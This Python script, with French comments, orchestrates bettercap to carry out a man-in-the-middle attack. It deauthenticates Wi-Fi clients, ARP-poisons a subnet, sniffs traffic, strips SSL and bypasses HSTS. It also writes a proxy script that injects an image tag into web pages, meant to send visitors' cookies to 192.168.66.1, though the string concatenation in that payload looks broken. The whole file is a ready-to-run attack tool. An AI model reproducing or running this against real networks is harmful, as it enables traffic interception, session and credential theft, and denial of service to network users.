#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
MITM ATTACK SUITE – bettercap Orchestrator v2
-------------------------------------------------------------
Lance bettercap avec :
  - wifi.deauth   (déauthentification des clients)
  - arp.spoof     (empoisonnement ARP)
  - net.sniff     (capture du trafic)
  - http.proxy    (proxy HTTP avec SSLstrip)
  - hstshijack    (contournement HSTS)
  - wifi.recon    (scan des réseaux et clients)

Auteur : Â§
"""

import os
import sys
import time
import signal
import subprocess
import shutil
import argparse
import threading
import re
from typing import Optional

# ========== CONFIGURATION ==========
DEFAULT_MON_INTERFACE = "wlan0mon"
DEFAULT_MITM_INTERFACE = "wlan0"
DEFAULT_GATEWAY = "192.168.1.1"
DEFAULT_TARGET_BSSID = "AA:BB:CC:DD:EE:FF"
DEFAULT_TARGETS = "192.168.1.0/24"

# ========== FONCTIONS UTILITAIRES ==========
def log(msg: str, color: str = ""):
    if color:
        print(f"{color}[{time.strftime('%H:%M:%S')}] {msg}\033[0m")
    else:
        print(f"[{time.strftime('%H:%M:%S')}] {msg}")

def error(msg: str):
    log(f"ERROR: {msg}", "\033[91m")
    sys.exit(1)

def success(msg: str):
    log(msg, "\033[92m")

def check_root():
    if os.geteuid() != 0:
        error("Ce script doit être exécuté en root (sudo).")

def check_deps():
    if not shutil.which("bettercap"):
        error("bettercap n'est pas installé. Installez avec: apt install bettercap")

def parse_arguments():
    parser = argparse.ArgumentParser(description="MITM Attack avec bettercap")
    parser.add_argument("--mon-interface", default=DEFAULT_MON_INTERFACE, help="Interface en mode monitor (pour déauth)")
    parser.add_argument("--mitm-interface", default=DEFAULT_MITM_INTERFACE, help="Interface réseau avec IP (pour ARP spoof)")
    parser.add_argument("--gateway", default=DEFAULT_GATEWAY, help="Adresse IP de la passerelle (routeur)")
    parser.add_argument("--target-bssid", default=DEFAULT_TARGET_BSSID, help="BSSID de l'AP cible pour déauth")
    parser.add_argument("--targets", default=DEFAULT_TARGETS, help="Plage IP pour ARP spoof (ex: 192.168.1.0/24)")
    parser.add_argument("--no-deauth", action="store_true", help="Désactive le module de déauth")
    parser.add_argument("--no-proxy", action="store_true", help="Désactive le proxy HTTP")
    parser.add_argument("--no-hstshijack", action="store_true", help="Désactive hstshijack")
    return parser.parse_args()

# ========== GÉNÉRATION DU SCRIPT BETTERCAP ==========
def generate_bettercap_script(args):
    """Construit la chaîne -eval pour bettercap."""
    lines = []

    # Interfaces
    lines.append(f"set net.interface {args.mitm_interface}")
    lines.append(f"set wifi.interface {args.mon_interface}")

    # ARP spoof
    lines.append(f"set arp.spoof.targets {args.targets}")
    lines.append("set arp.spoof.fullduplex true")
    lines.append("set arp.spoof.internal true")

    # Sniff
    lines.append("set net.sniff.local true")
    lines.append("set net.sniff.output /tmp/mitm_sniff.pcap")

    # Proxy HTTP
    if not args.no_proxy:
        lines.append("set http.proxy.sslstrip true")
        # Petit script de proxy pour logger les requêtes
        proxy_script = "/tmp/http_proxy.js"
        with open(proxy_script, "w") as f:
            f.write("""
function onRequest(req, res) {
    console.log("[HTTP] " + req.Method + " " + req.Path);
}
function onResponse(req, res) {
    if (res.ContentType && res.ContentType.indexOf('text/html') === 0) {
        var body = res.ReadBody();
        // Injection d'un pixel de tracking (exfiltration de cookies)
        var payload = '<img src="http://192.168.66.1/cookie?c="+document.cookie />';
        res.Body = body.replace('</body>', payload + '</body>');
    }
}
""")
        lines.append(f"set http.proxy.script {proxy_script}")
        lines.append("http.proxy on")

    # HSTS hijack
    if not args.no_hstshijack:
        lines.append("set hstshijack.sslstrip true")
        lines.append("hstshijack on")

    # Reconnaissance WiFi (pour voir les clients)
    lines.append("wifi.recon on")

    # Deauth
    if not args.no_deauth:
        lines.append(f"set wifi.deauth.bssid {args.target_bssid}")
        lines.append("set wifi.deauth.interval 5")   # toutes les 5 secondes
        lines.append("wifi.deauth on")

    # Démarrer le sniffing et l'ARP spoof
    lines.append("net.sniff on")
    lines.append("arp.spoof on")

    # Afficher les événements en continu
    lines.append("events.stream on")

    return "; ".join(lines)

# ========== LANCEUR BETTERCAP ==========
def launch_bettercap(script):
    """Lance bettercap en mode non-interactif et affiche sa sortie."""
    cmd = ["bettercap", "-eval", script]
    log("Lancement de bettercap avec les commandes suivantes :", "\033[94m")
    print("  " + script + "\n")
    log("Appuyez sur Ctrl+C pour arrêter.\n")

    # Démarrer le sous‑processus
    process = subprocess.Popen(cmd,
                               stdout=subprocess.PIPE,
                               stderr=subprocess.STDOUT,
                               universal_newlines=True,
                               bufsize=1)

    # Lire et afficher chaque ligne en temps réel avec couleurs
    def read_output():
        for line in iter(process.stdout.readline, ''):
            if not line:
                break
            line = line.strip()
            if not line:
                continue
            # Coloration selon le contexte
            if "deauth" in line.lower():
                print(f"\033[91m{line}\033[0m")  # rouge
            elif "sniff" in line.lower() or "http" in line.lower():
                print(f"\033[93m{line}\033[0m")  # jaune
            elif "arp" in line.lower():
                print(f"\033[96m{line}\033[0m")  # cyan
            elif "wifi.recon" in line.lower() or "station" in line.lower():
                print(f"\033[95m{line}\033[0m")  # magenta
            else:
                print(line)

    thread = threading.Thread(target=read_output, daemon=True)
    thread.start()

    # Gestion de l'interruption
    try:
        process.wait()
    except KeyboardInterrupt:
        log("Interruption demandée. Arrêt de bettercap...")
        process.terminate()
        time.sleep(2)
        if process.poll() is None:
            process.kill()
        process.wait()

# ========== NETTOYAGE ==========
def cleanup():
    log("Nettoyage...")
    subprocess.call(["pkill", "-f", "bettercap"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    log("Nettoyage terminé.")

# ========== MAIN ==========
def main():
    check_root()
    check_deps()

    args = parse_arguments()

    # Vérification rapide des interfaces
    if not os.path.exists(f"/sys/class/net/{args.mon_interface}"):
        error(f"L'interface {args.mon_interface} n'existe pas.")
    if not os.path.exists(f"/sys/class/net/{args.mitm_interface}"):
        error(f"L'interface {args.mitm_interface} n'existe pas.")

    # Générer le script bettercap
    script = generate_bettercap_script(args)

    # Lancer bettercap
    launch_bettercap(script)

    cleanup()

if __name__ == "__main__":
    main() 
